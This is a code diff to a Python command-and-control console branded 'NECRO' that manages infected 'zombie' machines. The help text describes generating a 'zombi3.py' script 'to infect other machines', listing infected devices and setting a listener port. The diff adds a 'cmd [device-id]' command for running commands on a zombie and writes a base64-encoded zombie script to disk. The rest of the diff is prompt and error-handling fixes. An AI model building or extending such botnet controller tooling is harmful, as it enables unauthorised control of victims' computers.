@@ -102,6 +102,7 @@ Available Commands:
   echo [text]        - Repeats what you type
   help               - Shows this help message
   clear              - Clears the screen
+  cmd [device-id]    - Command to execute on zombie
   zombie             - Generates a zombi3.py script to infect other machines
   devs/devices       - Prints the current list of devices infected
   port               - Sets the port for the listener on the machine
@@ -197,7 +198,7 @@ def main():
 
     # Print with color and skulls
     print(Fore.GREEN + CStyle.BRIGHT + banner)
-    print(Fore.GREEN + CStyle.BRIGHT + '☠️   v1.0  ☠️'.center(70))
+    print(Fore.GREEN + CStyle.BRIGHT + '☠️   v1.0   ☠️'.center(70))
     print()
 
     history = InMemoryHistory()
@@ -211,8 +212,9 @@ def main():
 
     while True:
         try:
+            dir = os.getcwd()
             command_line = session.prompt(
-            HTML(f'<prompt>NECRO {datetime.now().strftime('%d-%m-%y %H:%M:%S')} $&gt;&gt; </prompt>'),
+            HTML(f"""<prompt> _____({dir}) \n| NECRO {datetime.now().strftime('%m-%d-%y %H:%M:%S')} $&gt;&gt; </prompt>"""),
             style=style
         )
         except (EOFError, KeyboardInterrupt):
@@ -243,15 +245,17 @@ def main():
 
                 if not zombies:
                     print("No zombies found.")
-                    return
-
-                print("\n🧟 List of Zombies:\n")
-                for device_id, info in zombies.items():
-                    print(f"ID: {device_id} | Address: {info['address']} | Listener Port: {info['port']}")
+                else:
+                    print("\n🧟 List of Zombies:\n")
+                    for device_id, info in zombies.items():
+                        print(f"ID: {device_id} | Address: {info['address']} | Listener Port: {info['port']}")
 
                 print()
             except (FileNotFoundError, json.JSONDecodeError):
                 print("No valid zombies.json file found.")
+               
+            except Exception as e:
+                print(f"Error: {e}")
 
         elif command == "zombie" or command == "zomb":
             os.system(f'echo "{ZOMBIE_SCRIPT}" | base64 -d > zombi3.py')
@@ -299,12 +303,16 @@ def main():
 
         else:
             try:
-                value = os.system(command + ' ' + arg)
-                if value == 32512:
-                    print(Fore.RED + f"Unknown command: {command}")
+                print(arg)
+                if command == "cd":
+                    os.chdir(arg)
+                else:
+                    value = os.system(command + ' ' + arg)
+                    if value == 32512:
+                        print(Fore.RED + f"Unknown command: {command}")
+                        
             except:
-                print(Fore.RED + f"Unknown command: {command}")
-            
+                print(Fore.RED + f"Invalid Command: {command}") 
 
 if __name__ == "__main__":
     main()
